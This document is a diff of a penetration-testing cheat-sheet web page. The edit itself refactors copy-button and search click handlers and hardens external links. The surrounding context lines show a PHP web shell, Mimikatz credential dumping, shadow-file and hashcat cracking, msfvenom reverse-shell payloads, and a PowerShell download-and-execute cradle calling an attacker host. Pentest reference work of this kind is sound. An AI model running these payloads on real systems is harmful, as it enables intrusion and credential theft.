 &lt;?php passthru($_GET['cmd']); ?&gt;
@@ -3188,7 +3189,7 @@ curl -d "c=id" http://$IP/shell.php
     <div class="card searchable">
       <div class="card-title">🗝️ Windows Credential Dump</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">CMD/PS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">CMD/PS</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Mimikatz</span>
 privilege::debug
 sekurlsa::logonpasswords
@@ -3213,7 +3214,7 @@ procdump.exe <span class="c-flag">-accepteula</span> <span class="c-flag">-ma</s
     <div class="card searchable">
       <div class="card-title">🐧 Linux Credential Hunt</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># /etc/shadow (need root or shadow group)</span>
 cat /etc/shadow
 john --wordlist=rockyou.txt shadow.txt
@@ -3257,7 +3258,7 @@ find / <span class="c-flag">-name</span> authorized_keys 2>/dev/null</pre>
     <div class="card searchable">
       <div class="card-title">🔨 Hashcat Modes & Rules</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Basic crack</span>
 hashcat <span class="c-flag">-m 0</span> hash.txt rockyou.txt
 
@@ -3370,7 +3371,7 @@ hashcat <span class="c-flag">-m 0</span> hash.txt <span class="c-flag">--show</s
     <div class="card searchable">
       <div class="card-title">🔥 msfvenom Quick Payloads</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Linux ELF</span>
 msfvenom <span class="c-flag">-p</span> linux/x64/shell_reverse_tcp LHOST=<span class="c-var">$IP</span> LPORT=4444 <span class="c-flag">-f</span> elf > shell.elf
 
@@ -3395,7 +3396,7 @@ msfvenom <span class="c-flag">-p</span> python/shell_reverse_tcp LHOST=<span cla
     <div class="card searchable">
       <div class="card-title">📜 PowerShell Payloads</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">POWERSHELL</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Execution policy bypass</span>
 powershell <span class="c-flag">-ExecutionPolicy Bypass</span> <span class="c-flag">-File</span> script.ps1
 powershell <span class="c-flag">-exec bypass</span> <span class="c-flag">-c</span> <span class="c-string">"IEX(New-Object Net.WebClient).DownloadString('http://$IP/ps.ps1')"</span>
@@ -3416,7 +3417,7 @@ powershell <span class="c-flag">-EncodedCommand</span> $enc</pre>
     <div class="card searchable">
       <div class="card-title">🌊 WAF Bypass Techniques</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">PAYLOAD</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment">-- URL encoding</span>
 %27 = ' | %3C = < | %22 = " | %2F = /
 
@@ -3446,7 +3447,7 @@ SELECT%0aversion() (newline)
     <div class="card searchable">
       <div class="card-title">🔗 File Transfer Methods</div>
       <div class="code-block">
-        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+        <div class="code-header"><span class="code-lang">BASH</span><button class="copy-btn" >Copy</button></div>
         <pre><span class="c-comment"># Linux → Download</span>
 wget http://<span class="c-var">$LHOST</span>:8888/file
 curl <span class="c-flag">-o</span> file http://<span class="c-var">$LHOST</span>:8888/file
@@ -3891,19 +3892,46 @@ cat file | base64
 <script>
 // ── COPY CODE ──────────────────────────────────
 function copyCode(btn) {
-  const pre = btn.closest('.code-block').querySelector('pre');
+  const codeBlock = btn.closest('.code-block');
+  if (!codeBlock) return;
+  const pre = codeBlock.querySelector('pre');
+  if (!pre) return;
   const text = pre.innerText;
-  navigator.clipboard.writeText(text).then(() => {
-    btn.textContent = 'Copied!';
-    btn.style.color = 'var(--green)';
-    btn.style.borderColor = 'var(--green)';
-    setTimeout(() => {
-      btn.textContent = 'Copy';
-      btn.style.color = '';
-      btn.style.borderColor = '';
-    }, 1500);
-  });
+
+  if (navigator.clipboard && window.isSecureContext) {
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'Copied!';
+      btn.style.color = 'var(--green)';
+      btn.style.borderColor = 'var(--green)';
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+        btn.style.color = '';
+        btn.style.borderColor = '';
+      }, 1500);
+    }).catch(() => {
+      btn.textContent = 'Failed';
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+      }, 1200);
+    });
+    return;
+  }
+
+  const fallback = document.createElement('textarea');
+  fallback.value = text;
+  document.body.appendChild(fallback);
+  fallback.select();
+  try { document.execCommand('copy'); btn.textContent = 'Copied!'; }
+  catch { btn.textContent = 'Failed'; }
+  document.body.removeChild(fallback);
+  setTimeout(() => { btn.textContent = 'Copy'; }, 1200);
 }
+
+document.addEventListener('click', (event) => {
+  const btn = event.target.closest('.copy-btn');
+  if (!btn) return;
+  copyCode(btn);
+});
 
 // ── NAV ACTIVE ─────────────────────────────────
 const sections = document.querySelectorAll('section[id]');
@@ -3960,7 +3988,7 @@ searchInput.addEventListener('input', function() {
   
   if (matches.length > 0) {
     searchResults.innerHTML = matches.map(m => `
-      <div class="search-result-item" onclick="scrollToResult(this)" data-section="${m.isSection ? m.id : m.el.closest('section')?.id || ''}">
+      <div class="search-result-item" data-section="${m.isSection ? m.id : m.el.closest('section')?.id || ''}">
         <div class="search-result-title">${highlight(m.title, query)}</div>
         <div class="search-result-section">${m.section}</div>
       </div>
@@ -3987,8 +4015,31 @@ function scrollToResult(el) {
 }
 
 document.addEventListener('click', (e) => {
+  const copyButton = e.target.closest('.copy-btn');
+  if (copyButton) {
+    copyCode(copyButton);
+    return;
+  }
+
+  const resultItem = e.target.closest('.search-result-item');
+  if (resultItem) {
+    scrollToResult(resultItem);
+    return;
+  }
+
   if (!e.target.closest('.header-search')) {
     searchResults.style.display = 'none';
+  }
+});
+
+document.querySelectorAll('a[href]').forEach(link => {
+  const href = (link.getAttribute('href') || '').trim();
+  if (/^https?:\/\//i.test(href) || href.startsWith('//')) {
+    link.setAttribute('referrerpolicy', 'no-referrer');
+    const rel = new Set((link.getAttribute('rel') || '').split(/\s+/).filter(Boolean));
+    rel.add('noopener');
+    rel.add('noreferrer');
+    link.setAttribute('rel', Array.from(rel).join(' '));
   }
 });
 
